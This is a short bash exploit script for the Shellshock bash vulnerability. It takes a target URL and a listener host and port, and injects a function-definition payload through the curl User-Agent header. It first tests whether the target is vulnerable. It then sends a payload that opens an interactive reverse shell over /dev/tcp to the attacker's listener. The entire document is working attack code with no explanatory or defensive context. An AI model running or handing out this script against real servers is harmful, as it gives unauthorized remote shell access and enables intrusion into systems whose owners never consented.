#!/bin/bash
if [[ -z "$1" || -z "$2" || -z "$3" ]]; then
  printf "\nUsage: bash %s <url> <lhost> <lport>\n" "$0"
  exit 0
fi
url=$1
LHOST=$2
LPORT=$3
printf "[?] Testing if target is vulnerable\n"
if [[ -z $(curl -A "() { :;}; /bin/echo 'a'" -s "$url") ]]; then
  printf "[!]Not vulnerable\n[-]Exiting...\n"
  exit 0
fi
printf "[+] Target vulnerable\n"
if ! netstat -lt | grep -q "$LPORT"; then
  printf "[!] You're not listening on port %s\n[+] Set it up and press enter" "$LPORT"
  read -r
fi
curl -A "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &" -s --output /dev/null "$url" && printf "[!] Check your listener\n"
